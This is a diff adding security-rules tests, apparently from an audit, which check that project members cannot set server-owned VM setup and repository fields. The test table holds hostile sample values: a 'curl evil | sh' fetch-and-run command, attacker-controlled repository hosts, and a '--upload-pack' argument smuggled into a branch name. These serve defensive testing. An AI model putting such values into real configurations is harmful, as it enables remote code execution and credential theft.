@@ -753,6 +753,52 @@ describe('the Mollie subscription billing fields are server-owned (security audi
     })
 })
 
+describe('VM coding inputs on the project document are server-owned (security audit 2026-11)', () => {
+    // Another member's credentialed VM coding job boots from the golden snapshot and pairs the
+    // repository connection with that member's token, so a member must not be able to set them.
+    it.each([
+        ['vmGolden', { setupCommand: 'curl evil | sh', snapshotId: 'team/elsewhere:1', status: 'ready' }],
+        ['vmGolden.setupCommand', 'curl evil | sh'],
+        ['githubRepoUrl', 'https://attacker.invalid/acme/app'],
+        ['githubApiBase', 'https://attacker.invalid/api/v3'],
+        ['githubHost', 'https://attacker.invalid'],
+        ['githubBaseBranch', '--upload-pack=evil'],
+        ['gitlabRepoUrl', 'https://attacker.invalid/group/app'],
+        ['gitlabHost', 'https://attacker.invalid'],
+        ['gitlabBaseBranch', 'evil'],
+    ])('refuses a member write of %s', async (field, value) => {
+        const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
+
+        await assertFails(updateDoc(doc(memberDb, `projects/${PROJECT_ID}`), { [field]: value }))
+    })
+
+    it('leaves ordinary member edits of the project alone', async () => {
+        const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
+
+        await assertSucceeds(updateDoc(doc(memberDb, `projects/${PROJECT_ID}`), { name: 'Renamed' }))
+        await assertSucceeds(setDoc(doc(memberDb, `projects/${PROJECT_ID}`), { lastActionDate: 7 }, { merge: true }))
+    })
+
+    it('still lets a creator start a project with empty repository fields', async () => {
+        const creatorDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
+
+        await assertSucceeds(
+            setDoc(doc(creatorDb, 'projects/new-project-with-repo-fields'), {
+                creatorId: MEMBER_ID,
+                isShared: 2,
+                userIds: [MEMBER_ID],
+                githubRepoUrl: '',
+                githubBaseBranch: '',
+                githubHost: '',
+                githubApiBase: '',
+                gitlabRepoUrl: '',
+                gitlabBaseBranch: '',
+                gitlabHost: '',
+            })
+        )
+    })
+})
+
 describe('assistant task search authorization', () => {
     beforeEach(async () => {
         await testEnv.withSecurityRulesDisabled(async context => {
@@ -1612,6 +1658,7 @@ describe('server-only data', () => {
         `firestoreAccessProjectionJobs/${PROJECT_ID}`,
         'firestoreAccessProjectionMigrations/schema-v2',
         'verifiedEmailIdentities/abc123/accounts/member',
+        `vmGoldens/${PROJECT_ID}`,
     ])('denies client reads and writes at %s', async documentPath => {
         const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
 
